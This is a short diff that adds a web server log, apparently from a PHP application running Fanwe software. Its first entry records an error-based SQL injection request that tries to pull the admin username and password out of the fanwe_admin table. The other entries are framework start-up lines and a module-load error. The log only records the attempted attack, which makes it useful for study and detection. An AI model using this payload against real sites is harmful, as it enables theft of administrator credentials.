@@ -1,0 +1,6 @@
+[ 2016-12-03T11:32:55+08:00 ] 211.101.15.239 //index.php?m=Goods&a=showcate&id=103%20and%20extractvalue(1,%20concat(0x7e,(SELECT%20distinct%20concat(0x23,adm_name,0x3a,adm_pwd,0x23)%20FROM%20fanwe_admin%20limit%200,1)))
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000418s ]
+ERR: 无法加载模块:Goods
+
